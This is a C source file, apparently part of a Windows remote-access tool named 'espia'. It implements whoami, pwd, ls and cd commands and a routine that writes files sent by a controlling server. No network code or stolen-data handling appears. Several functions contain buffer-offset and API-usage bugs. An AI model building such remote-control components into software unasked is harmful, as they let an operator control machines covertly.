#include "includes/espia_comms.h"
#include "includes/espia_func.h"

void whoami(LPWSTR buffer, INT size_buffer) {
    /* Get and append the Hostname */
    DWORD size_comp = size_buffer;
    if (GetComputerNameW(buffer, &size_comp) == 0) {
        Debug(printf("Failed to retrieve the Computer Name : %d\n", GetLastError());)
        StringCbCatW(buffer, size_buffer, L"<failed>");
        size_comp = 8;
    }

    /* Append an '@' symbol */
    StringCbCatW(buffer + size_comp, size_buffer, L"@");
    size_comp++;

    /* Get and append Username */
    DWORD size_usr = size_buffer;
    if (GetUserNameW(buffer + size_comp, &size_usr) == 0) {
        Debug(printf("Failed to retrieve the Username : %d\n", GetLastError()));
        StringCbCatW(buffer, size_buffer, L"<failed>");
    }
    StringCbCatW(buffer, size_buffer, L"\n");
    //printf("*%S*\n",buffer);
}

void pwd(LPWSTR buffer, INT size_buffer) {
    /* Get the current working directory */
    if (GetCurrentDirectoryW(size_buffer, buffer) == 0) {
        Debug(printf("Failed to retrieve the Current working directory: %d\n", GetLastError());)
        StringCbCatW(buffer, size_buffer, L"<failed>");
    }
}

/* 'ls' uses a callback function to handle file/folder output from FindNextFileW() */
void ls(INT (*callback)(PWSTR buffer, INT size_buffer)) {
    /* Get the current working directory and append '*' at the end */
    WCHAR temp_dir[MAX_PATH + 1] = L"";
    pwd(temp_dir, sizeof(temp_dir));
    StringCbCatW(temp_dir, sizeof(temp_dir), L"\\*");

    /* Get the file handler for current working dir */
    WIN32_FIND_DATAW file_data;
    HANDLE file_handle;
    if ((file_handle = FindFirstFileW(temp_dir, &file_data)) == INVALID_HANDLE_VALUE) {
        Debug(printf("FindFirstFileW() failed: %d\n", GetLastError());)
        return;
    }
    memset(temp_dir, 0, sizeof(temp_dir));

    /* Iterate over files/folders */
    LARGE_INTEGER filesize;
    do {
        /* If current file/folder is a directory */
        if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t<DIR>\n", file_data.cFileName);
        } 
        /* Else, a file */
        else {
            filesize.LowPart = file_data.nFileSizeLow;
            filesize.HighPart = file_data.nFileSizeHigh;
            StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t%ld bytes\n", file_data.cFileName, filesize.QuadPart);
        }

        (*callback)(temp_dir, wcslen(temp_dir)*sizeof(WCHAR));                                         // Call the callback function to handle output
    } while (FindNextFileW(file_handle, &file_data) != 0);
}

INT cd(PWSTR path, PWSTR buffer, INT size_buffer) {
    if (SetCurrentDirectoryW(path) == 0) {
        Debug(printf("Changing directory failed: %d\n", GetLastError());)
        StringCbPrintfW(buffer, size_buffer, L"Changing directory failed: %d\n", GetLastError());
        return CD_ERROR;
    }
    return ESPIA_OK;
}

INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buffer), INT (*output_stream)(PWSTR buffer, INT size_buffer)) {
    WCHAR comm_buff[9] = L"\0";
    CHAR file_recv_buff[1024] = "\0";
    if ((*input_stream)(file_recv_buff, sizeof(file_recv_buff)) < 0) {
        Debug(printf("Recieving failed\n");)
        return FILE_CREATION_FAIL;
    }

    /* Converts the file size to int */
    int sum = 0, dig = 0, pow = wcslen((PWSTR)file_recv_buff) - 1;
    for (int i = 0 ; i < wcslen((PWSTR)file_recv_buff) ; i++) {
        dig = *(((PWSTR)file_recv_buff) + i) - L'0';
        for (int j = 0 ; j < pow ; j++)
            dig *= 10;
        sum += dig;
        pow--;
    }

    /* Create the file */
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {                            // If failed. Notify the server.
        StringCbCatW(comm_buff, sizeof(comm_buff), L"den<end>");
        (*output_stream)(comm_buff, sizeof(comm_buff));
        return FILE_CREATION_FAIL;
    }
    StringCbCatW(comm_buff, sizeof(comm_buff), L"ack<end>");        // Else continue
    (*output_stream)(comm_buff, sizeof(comm_buff));

    /* Recieve and write */
    int recieved_bytes = 0, full_bytes = 0;
    memset(file_recv_buff, 0, sizeof(file_recv_buff));
    while (full_bytes != sum) {
        recieved_bytes = (*input_stream)(file_recv_buff, sizeof(file_recv_buff));
        if (recieved_bytes < 0) {
            Debug(printf("Recieveing failed\n");)
            return FILE_CREATION_FAIL;
        }
        if (WriteFile(hFile, file_recv_buff, recieved_bytes, NULL, nullptr) == 0) {
            Debug(printf("Write failed\n");)
            return FILE_CREATION_FAIL;
        }
        full_bytes += recieved_bytes;
    }

    /* Close the handle */
    CloseHandle(hFile);
    return 0;
}



